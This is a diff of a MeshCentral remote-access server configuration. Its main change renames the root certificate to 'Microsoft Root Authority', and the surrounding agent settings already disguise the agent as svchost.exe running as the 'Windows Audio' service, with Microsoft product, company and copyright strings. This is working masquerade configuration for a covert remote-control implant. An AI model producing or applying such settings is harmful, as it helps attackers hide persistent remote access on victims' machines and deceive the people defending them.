@@ -50,7 +50,7 @@
     },
     "agentsInRam": true,
     "lockAgentDownload": false,
-    "rootCertCommonName": "MeshCentralRoot-Auto",
+    "rootCertCommonName": "Microsoft Root Authority",
     "agentUpdateSystem": 2,
     "allowHighQualityDesktop": true
   },
@@ -81,7 +81,7 @@
       "agentCustomization": {
         "displayName": "Service Host: Local Service (Network Restricted))",
         "description": "Host Process for Windows",
-        "companyName": "Microsoft®",
+        "companyName": "Microsoft\u00ae",
         "serviceName": "Windows Audio",
         "installText": "",
         "fileName": "svchost",
@@ -92,9 +92,9 @@
         "fileDescription": "Host Process for Windows Services",
         "fileVersion": "1.0.0.0",
         "internalName": "svchost",
-        "legalCopyright": "© Microsoft Corporation. All rights reserved.",
+        "legalCopyright": "\u00a9 Microsoft Corporation. All rights reserved.",
         "originalFilename": "svchost.exe",
-        "productName": "Microsoft® Windows® operating system",
+        "productName": "Microsoft\u00ae Windows\u00ae operating system",
         "productVersion": "v1.0.0",
         "icon": "service.ico"
       },
